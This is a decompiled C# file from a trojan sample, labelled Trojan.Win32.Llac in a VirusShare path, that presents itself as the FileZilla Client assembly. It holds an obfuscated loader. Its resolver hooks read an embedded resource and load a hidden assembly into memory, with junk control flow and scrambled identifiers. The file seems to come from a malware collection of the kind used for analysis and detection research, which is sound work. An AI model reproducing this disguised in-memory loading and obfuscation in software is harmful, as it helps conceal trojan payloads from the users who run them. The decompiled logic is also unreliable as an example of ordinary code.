// Decompiled with JetBrains decompiler
// Type: .
// Assembly: FileZilla Client, Version=3.5.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B794D7B0-77D8-4DB9-A117-32697E11C530
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Llac.coih-d4a46fe8e815224c23e37613278718e055c3b6df9e98f5bf6e3c86f949db54e3.exe

using \u0002;
using System;
using System.IO;
using System.Reflection;

namespace \u0004
{
  internal class \u0002
  {
    private static readonly Assembly \u0001;

    static \u0002()
    {
      AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0004.\u0002.\u0002);
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0004.\u0002.\u0001);
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      Assembly cee032ce5bac4a45bae3ca1459d69e02f;
      if (true)
        cee032ce5bac4a45bae3ca1459d69e02f = executingAssembly;
      \u0004.\u0002.\u0001 = Assembly.Load(\u0004.\u0002.\u0001(cee032ce5bac4a45bae3ca1459d69e02f));
    }

    internal static void \u0001()
    {
    }

    private static Assembly \u0001(
      object ce4291ad9e7104785aeafdaf971e89251,
      ResolveEventArgs c167399a6632325e332dd3fd5ae19dfbd)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string name = \u0004.\u0002.\u0001(executingAssembly);
      if (false)
        goto label_2;
      else
        goto label_8;
label_1:
      int num;
      if (num == 0)
        return (Assembly) null;
label_2:
      switch (2)
      {
        case 0:
          goto label_2;
        default:
          Stream manifestResourceStream;
          do
          {
            num = 1;
            if (num != 0 && num != 0)
            {
              if (num == 0)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0004.\u0002.\u0001);
              }
              if (true)
                manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
              else
                goto label_2;
            }
            else
              goto label_1;
          }
          while (false);
          return Assembly.Load(\u0003.\u0001(manifestResourceStream));
      }
label_8:
      num = c167399a6632325e332dd3fd5ae19dfbd.Name.StartsWith(name) ? 1 : 0;
      goto label_1;
    }

    private static string \u0001(Assembly cee032ce5bac4a45bae3ca1459d69e02f)
    {
      string str = cee032ce5bac4a45bae3ca1459d69e02f.FullName;
      int num1 = str.IndexOf(',');
      while (true)
      {
        int length = num1;
        int num2;
        int num3;
        do
        {
          num2 = length;
          int num4;
          while (true)
          {
            if (true)
            {
              num3 = 0;
              if (num3 == 0)
              {
                if (num2 < num3)
                  goto label_13;
              }
              else
                goto label_1;
            }
            else
              goto label_8;
label_7:
            num2 = 3;
label_8:
            switch (num2)
            {
              case 0:
                goto label_7;
              default:
                if (true)
                {
                  num4 = 1;
                  if (num4 == 0)
                  {
                    num2 = num4;
                    continue;
                  }
                  goto label_11;
                }
                else
                  goto label_12;
            }
          }
label_11:
          if (num4 != 0)
            goto label_16;
label_12:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0004.\u0002.\u0001);
          goto label_16;
label_13:
          continue;
label_16:
          str = str.Substring(0, length);
          goto label_13;
        }
        while (false);
        break;
label_1:
        num1 = num3;
        num1 = num2;
      }
      return str + str + str;
    }

    private static Assembly \u0002(
      object ce4291ad9e7104785aeafdaf971e89251,
      ResolveEventArgs c167399a6632325e332dd3fd5ae19dfbd)
    {
      Assembly assembly;
      do
      {
        string[] manifestResourceNames;
        if ((object) \u0004.\u0002.\u0001 != null)
          manifestResourceNames = \u0004.\u0002.\u0001.GetManifestResourceNames();
        else
          goto label_14;
label_2:
        int num1 = 0;
        goto label_19;
label_5:
        int num2 = 1;
        if (num2 != 0)
        {
          if (num2 == 0)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0004.\u0002.\u0002);
          }
          do
          {
            assembly = \u0004.\u0002.\u0001;
          }
          while (false);
          continue;
        }
        num1 = num2;
        goto label_19;
label_14:
        if (true)
        {
          if (true)
            return \u0004.\u0002.\u0001;
          goto label_5;
        }
        else
          goto label_2;
label_19:
        for (int index = num1; index < manifestResourceNames.Length; ++index)
        {
          if (manifestResourceNames[index] == c167399a6632325e332dd3fd5ae19dfbd.Name)
            goto label_4;
        }
        goto label_11;
label_4:
        switch (6)
        {
          case 0:
            goto label_4;
          default:
            goto label_5;
        }
label_11:
        switch (2)
        {
          case 0:
            goto label_11;
          default:
            if (true)
              return (Assembly) null;
            goto label_4;
        }
      }
      while (false);
      return assembly;
    }
  }
}
